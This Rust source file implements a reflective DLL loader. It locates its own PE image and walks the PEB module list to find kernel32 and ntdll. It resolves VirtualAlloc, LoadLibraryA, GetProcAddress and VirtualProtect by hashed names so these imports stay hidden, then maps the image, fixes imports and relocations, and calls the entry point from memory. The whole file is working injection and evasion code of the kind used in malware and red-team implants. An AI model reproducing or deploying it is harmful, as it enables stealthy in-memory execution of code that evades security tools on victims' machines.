#![no_std]

mod helpers;
mod structures;

use crate::{
	helpers::{fnv1a_hash_32, fnv1a_hash_32_wstr, simple_memcpy},
	structures::{ExportTable, PeHeaders},
};
use core::{
	arch::asm,
	ffi::c_void,
	mem::{size_of, transmute},
	ptr::{null, null_mut},
	slice,
};
use ntapi::{
	ntldr::LDR_DATA_TABLE_ENTRY,
	ntpebteb::TEB,
	ntpsapi::PEB_LDR_DATA,
	winapi::{
		shared::{
			basetsd::SIZE_T,
			ntdef::{HANDLE, NTSTATUS, PVOID},
		},
		um::winnt::{DLL_PROCESS_ATTACH, PAGE_NOACCESS},
	},
};
use object::{
	pe::{
		ImageThunkData64, IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_REL_BASED_ABSOLUTE,
		IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGHLOW, IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ,
		IMAGE_SCN_MEM_WRITE,
	},
	read::pe::{ImageNtHeaders, ImageOptionalHeader, ImageThunkData},
	LittleEndian,
};
use wchar::wch;
use windows_sys::{
	core::PCSTR,
	Win32::{
		Foundation::{BOOL, FARPROC, HINSTANCE},
		System::Memory::{
			MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
			PAGE_EXECUTE_WRITECOPY, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE,
			PAGE_WRITECOPY, VIRTUAL_ALLOCATION_TYPE,
		},
	},
};

const KERNEL32_HASH: u32 = fnv1a_hash_32_wstr(wch!("KERNEL32.DLL"));
const NTDLL_HASH: u32 = fnv1a_hash_32_wstr(wch!("ntdll.dll"));

const VIRTUALALLOC_HASH: u32 = fnv1a_hash_32("VirtualAlloc".as_bytes());
const LOADLIBRARYA_HASH: u32 = fnv1a_hash_32("LoadLibraryA".as_bytes());
const GETPROCADDRESS_HASH: u32 = fnv1a_hash_32("GetProcAddress".as_bytes());
const NTFLUSHINSTRUCTIONCACHE_HASH: u32 = fnv1a_hash_32("NtFlushInstructionCache".as_bytes());
const VIRTUALPROTECT: u32 = fnv1a_hash_32("VirtualProtect".as_bytes());

fn find_pe(start: usize) -> Option<(*mut u8, PeHeaders)> {
	let mut page_aligned = start & !0xfff;
	loop {
		if page_aligned == 0 {
			return None;
		}

		match PeHeaders::parse(page_aligned as _) {
			Some(pe) => break Some((page_aligned as _, pe)),
			None => page_aligned -= 0x1000,
		}
	}
}

fn find_loaded_module_base(ldr: &PEB_LDR_DATA, hash: u32) -> Option<*mut u8> {
	// Get initial entry in the list
	let mut ldr_data_ptr = ldr.InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;
	while !ldr_data_ptr.is_null() {
		let ldr_data = unsafe { &*ldr_data_ptr };

		// Make a slice of wchars from the base name
		let dll_name = ldr_data.BaseDllName;
		let dll_name_wstr =
			unsafe { slice::from_raw_parts(dll_name.Buffer, dll_name.Length as usize / 2) };

		if fnv1a_hash_32_wstr(dll_name_wstr) != hash {
			// Go to the next entry
			ldr_data_ptr = ldr_data.InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY;
			continue;
		}

		// Return the base address for this DLL
		return Some(ldr_data.DllBase as _);
	}
	None
}

fn find_export_va(table: &ExportTable, base: *mut u8, hash: u32) -> Option<*mut u8> {
	table
		.iter_string_addr(base)
		.find(|(name, _)| fnv1a_hash_32(name.to_bytes()) == hash)
		.map(|(_, a)| a)
}

// #[inline(never)]
fn load() -> (*mut u8, *mut u8) {
	let rip: usize;
	unsafe { asm!("lea {rip}, [rip]", rip = out(reg) rip) };

	let (pe_base, pe) = find_pe(rip).unwrap();

	// Locate other important data structures
	let teb: *mut TEB;
	unsafe {
		#[cfg(target_arch = "x86_64")]
		asm!("mov {teb}, gs:[0x30]", teb = out(reg) teb);
		#[cfg(target_arch = "x86")]
		asm!("mov {teb}, fs:[0x18]", teb = out(reg) teb);
	}
	let teb = unsafe { &mut *teb };
	let peb = unsafe { &mut *teb.ProcessEnvironmentBlock };

	let peb_ldr = unsafe { &*peb.Ldr };

	// Traverse loaded modules to find kernel32.dll and ntdll.dll
	let kernel32_base = find_loaded_module_base(peb_ldr, KERNEL32_HASH).unwrap();
	let kernel32 = PeHeaders::parse(kernel32_base).unwrap();

	let ntdll_base = find_loaded_module_base(peb_ldr, NTDLL_HASH).unwrap();
	let ntdll = PeHeaders::parse(ntdll_base).unwrap();

	// Locate the export table for kernel32.dll
	let kernel32_export_table = kernel32.export_table_mem(kernel32_base).unwrap();

	// Find the required function locations in kernel32.dll
	let virtualalloc =
		find_export_va(&kernel32_export_table, kernel32_base, VIRTUALALLOC_HASH).unwrap();
	let virtualalloc = unsafe {
		transmute::<
			_,
			unsafe extern "system" fn(
				lpaddress: *const c_void,
				dwsize: usize,
				flallocationtype: VIRTUAL_ALLOCATION_TYPE,
				flprotect: PAGE_PROTECTION_FLAGS,
			) -> *mut c_void,
		>(virtualalloc)
	};

	let loadlibararya =
		find_export_va(&kernel32_export_table, kernel32_base, LOADLIBRARYA_HASH).unwrap();
	let loadlibrarya = unsafe {
		transmute::<_, unsafe extern "system" fn(lplibfilename: PCSTR) -> HINSTANCE>(loadlibararya)
	};
	let getprocaddress =
		find_export_va(&kernel32_export_table, kernel32_base, GETPROCADDRESS_HASH).unwrap();
	let getprocaddress = unsafe {
		transmute::<_, unsafe extern "system" fn(hmodule: HINSTANCE, lpprocname: PCSTR) -> FARPROC>(
			getprocaddress,
		)
	};

	let virtualprotect =
		find_export_va(&kernel32_export_table, kernel32_base, VIRTUALPROTECT).unwrap();
	let virtualprotect = unsafe {
		transmute::<
			_,
			unsafe extern "system" fn(
				lpaddress: *const c_void,
				dwsize: usize,
				flnewprotect: PAGE_PROTECTION_FLAGS,
				lpfloldprotect: *mut PAGE_PROTECTION_FLAGS,
			) -> BOOL,
		>(virtualprotect)
	};

	// Locate the export table for ntdll.dll
	let ntdll_export_table = ntdll.export_table_mem(ntdll_base).unwrap();

	// Find the required function locations in ntdll.dll
	let ntflushinstructioncache = find_export_va(
		&ntdll_export_table,
		ntdll_base,
		NTFLUSHINSTRUCTIONCACHE_HASH,
	)
	.unwrap();
	let ntflushinstructioncache = unsafe {
		transmute::<
			_,
			unsafe extern "system" fn(
				ProcessHandle: HANDLE,
				BaseAddress: PVOID,
				Length: SIZE_T,
			) -> NTSTATUS,
		>(ntflushinstructioncache)
	};

	// Allocate space to map the PE into
	let size_of_image = pe
		.nt_header
		.optional_header()
		.size_of_image
		.get(LittleEndian) as _;

	let allocated_ptr = unsafe {
		virtualalloc(
			null(),
			size_of_image,
			MEM_RESERVE | MEM_COMMIT,
			PAGE_READWRITE,
		)
	}
	.cast::<u8>();
	assert!(allocated_ptr != null_mut());

	// Copy over header data
	let header_size = pe
		.nt_header
		.optional_header()
		.size_of_headers
		.get(LittleEndian) as _;
	simple_memcpy(allocated_ptr, pe_base, header_size);

	// Map sections
	pe.section_headers.iter().for_each(|section| {
		let dest = unsafe { allocated_ptr.add(section.virtual_address.get(LittleEndian) as _) };
		let src = unsafe { pe_base.add(section.pointer_to_raw_data.get(LittleEndian) as _) };
		let size = section.size_of_raw_data.get(LittleEndian) as _;
		simple_memcpy(dest, src, size);
	});

	// Process import table
	let import_table = pe.import_table_mem(allocated_ptr).unwrap();
	for idt in import_table.import_descriptors {
		// Load the library
		let name_rva = idt.name.get(LittleEndian) as usize;
		let loaded_library_base = unsafe { loadlibrarya(allocated_ptr.add(name_rva)) } as *mut u8;
		assert!(!loaded_library_base.is_null());

		let ilt_rva = idt.original_first_thunk.get(LittleEndian) as usize;
		let iat_rva = idt.first_thunk.get(LittleEndian) as usize;

		let mut ilt_ptr = unsafe { allocated_ptr.add(ilt_rva).cast::<ImageThunkData64>() };
		let mut iat_ptr = unsafe { allocated_ptr.add(iat_rva).cast::<usize>() };

		// Look through each entry in the ILT until we find a null entry
		while unsafe { ilt_ptr.read().raw() != 0 } {
			let ilt_entry = unsafe { ilt_ptr.read() };

			let function_va = match ilt_entry.is_ordinal() {
				true => {
					// Load from ordinal
					let ordinal = ilt_entry.ordinal();

					// Find matching function in loaded library
					unsafe {
						getprocaddress(loaded_library_base as _, ordinal as _)
							.expect("getprocaddress failed")
					}
				}
				false => {
					// Load from name
					let address_rva = ilt_entry.address() as _;

					// Get the name of the function
					let string_va = unsafe { allocated_ptr.add(address_rva).add(size_of::<u16>()) };

					// Find matching function in loaded library
					unsafe {
						getprocaddress(loaded_library_base as _, string_va)
							.expect("getprocaddress failed")
					}
				}
			};
			// Write function VA into IAT
			unsafe { *iat_ptr = function_va as usize };

			// Advance to the next entry
			ilt_ptr = unsafe { ilt_ptr.add(1) };
			iat_ptr = unsafe { iat_ptr.add(1) };
		}
	}

	// Process relocations
	let image_base_in_file = pe.nt_header.optional_header().image_base();
	let calculated_offset = allocated_ptr as usize - image_base_in_file as usize;

	let relocations = pe
		.data_directories
		.get(IMAGE_DIRECTORY_ENTRY_BASERELOC)
		.unwrap();

	// Iterate through the relocation table
	let reloc_start_address =
		unsafe { allocated_ptr.add(relocations.virtual_address.get(LittleEndian) as _) };
	let reloc_size_bytes = relocations.size.get(LittleEndian) as _;

	let mut reloc_byte_slice =
		unsafe { slice::from_raw_parts(reloc_start_address, reloc_size_bytes) };

	// Loop over relocation blocks - each has a 8 byte header
	while let &[a, b, c, d, e, f, g, h, ref rest @ ..] = reloc_byte_slice {
		let rva = u32::from_le_bytes([a, b, c, d]) as usize;
		let relocs_bytes = u32::from_le_bytes([e, f, g, h]) as usize - 8;

		let block_va = unsafe { allocated_ptr.add(rva) };

		// Loop over the relocations in this block
		let (mut relocs_slice, rest) = rest.split_at(relocs_bytes);
		while let &[a, b, ref rest @ ..] = relocs_slice {
			let reloc = u16::from_le_bytes([a, b]);
			let reloc_type = (reloc & 0xf000) >> 0xc;
			let reloc_offset = reloc & 0x0fff;

			let reloc_va = unsafe { block_va.add(reloc_offset as _) };

			// Apply the relocation
			match reloc_type {
				IMAGE_REL_BASED_ABSOLUTE => (),
				IMAGE_REL_BASED_DIR64 => {
					let ptr = reloc_va as *mut u64;
					unsafe { *ptr = *ptr + calculated_offset as u64 };
				}
				IMAGE_REL_BASED_HIGHLOW => {
					let ptr = reloc_va as *mut u32;
					unsafe { *ptr = *ptr + calculated_offset as u32 };
				}
				_ => panic!("Unsupported relocation type"),
			}

			relocs_slice = rest;
		}

		reloc_byte_slice = rest;
	}

	// Set header permissions
	let mut old_permissions = Default::default();
	unsafe {
		virtualprotect(
			allocated_ptr as _,
			header_size,
			PAGE_READONLY,
			&mut old_permissions,
		)
	};

	// Set section permissions
	pe.section_headers.iter().for_each(|section| {
		let virtual_address =
			unsafe { allocated_ptr.add(section.virtual_address.get(LittleEndian) as _) };
		let virtual_size = section.virtual_size.get(LittleEndian) as _;

		// Change permissions
		let characteristics = section.characteristics.get(LittleEndian);
		let r = characteristics & IMAGE_SCN_MEM_READ != 0;
		let w = characteristics & IMAGE_SCN_MEM_WRITE != 0;
		let x = characteristics & IMAGE_SCN_MEM_EXECUTE != 0;
		let new_permissions = match (r, w, x) {
			(false, false, false) => PAGE_NOACCESS,
			(true, false, false) => PAGE_READONLY,
			(false, true, false) => PAGE_WRITECOPY,
			(true, true, false) => PAGE_READWRITE,
			(false, false, true) => PAGE_EXECUTE,
			(true, false, true) => PAGE_EXECUTE_READ,
			(false, true, true) => PAGE_EXECUTE_WRITECOPY,
			(true, true, true) => PAGE_EXECUTE_READWRITE,
		};
		let mut old_permissions = Default::default();
		unsafe {
			virtualprotect(
				virtual_address as _,
				virtual_size,
				new_permissions,
				&mut old_permissions,
			)
		};
	});

	let entry_point = unsafe {
		allocated_ptr.add(
			pe.nt_header
				.optional_header()
				.address_of_entry_point
				.get(LittleEndian) as _,
		)
	};

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing
	unsafe { ntflushinstructioncache(-1 as _, null_mut(), 0) };

	(allocated_ptr, entry_point)
}

#[no_mangle]
pub extern "system" fn reflective_loader(reserved: usize) {
	let (allocated_ptr, entry_point) = load();

	// Call entry point
	let entry_point_callable =
		unsafe { transmute::<_, unsafe extern "system" fn(usize, u32, usize)>(entry_point) };

	unsafe { entry_point_callable(allocated_ptr as _, DLL_PROCESS_ATTACH, reserved) };
}
